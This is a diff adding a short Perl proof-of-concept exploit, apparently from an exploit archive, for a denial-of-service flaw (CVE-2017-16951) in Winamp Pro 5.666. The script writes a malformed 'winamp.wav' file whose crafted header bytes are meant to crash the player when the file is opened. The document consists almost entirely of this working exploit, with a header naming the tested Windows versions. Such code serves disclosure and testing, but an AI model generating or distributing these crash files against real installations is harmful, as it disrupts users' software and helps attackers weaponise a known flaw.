@@ -1,0 +1,22 @@
+#! /usr/bin/perl
+# Exploit Title: Winamp Pro (.wav|.wmv|.au|.asf|.aiff|.aif ) Denial of Service
+# Date: 2017-11-22
+# Exploit Author: R.Yavari
+# Version: v5.66.Build.3512
+# Tested on: Windows 10 , Windows 7
+# other version should be affected
+# CVE-2017-16951
+# http://meggamusic.co.uk/winamp/winamp5666_full_en-us_redux.exe
+# (D.P)
+open(code, ">winamp.wav") || die "can't create crash sample.$!";
+binmode(code);
+$data = 
+"\x52\x49\x46\x46\xc2\x58\x01\x00\x57\x41\x56\x45\x44\x44\x44\x44" .
+"\xf8\xff\xff\xff\x01\x00\x01\x00\x22\x56\x00\x00\x44\xac\x00\x00" .
+"\x02\x00\x10\x00\x00\x00\x66\x61\x63\x74\x04\x00\x00\x00\x48\xac" .
+"\x13\x00\x13\x00\x12\x00\x14\x00\x14\x00";
+
+
+print code $data;
+ 
+close(code);
